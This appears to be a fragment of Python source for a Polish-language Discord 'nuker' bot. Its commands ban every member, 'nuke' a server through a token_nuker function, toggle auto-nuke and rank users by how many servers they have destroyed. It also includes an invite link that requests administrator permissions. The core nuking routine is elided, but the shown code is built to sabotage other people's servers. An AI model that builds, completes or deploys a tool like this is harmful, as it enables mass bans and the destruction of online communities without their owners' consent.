  ...
  if str(ctx.author.id) in config['users']:
    if await check.check_token(config[str(ctx.author.id)]['token']):
      if await check.check_guild(int(serverid), config[str(ctx.author.id)]['token']):
        await ctx.reply("rozpoczynam wypierdalanie serwera")
        a = await token_nuker(int(serverid))
        print(a)
      else:
        await ctx.reply("twoj bot nie jest na serwerze")
    else:
      await ctx.reply('twoj token jest nie prawidlowy')
  else:
    await ctx.reply('nie jestes w naszej bazie danych')
...
async def help(ctx):
    ...
    embed.set_footer(text="Created by Kryzo1337")

    commands = {
        "ban": "Banuje wszystkich na serwerze.",
        "help": "pokazuje tą wiadomosc.",
        "leaderboard": "Pokazuje tabele wynikow serwera!",
        "nuke": "Wywalasz serwer ",
        "stats": "Statystyki ile juz serwerow wywaliles",
        "unban": "Unbanuje kazdego na serwerze",
        "type": "auto-nuke off/on ",
    }
...
async def invite(ctx):
  ...
  embed.add_field(name="Zaproś mnie!", value=f"[kliku klik](https://discord.com/api/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot)", inline=False)
  await ctx.reply(embed=embed)
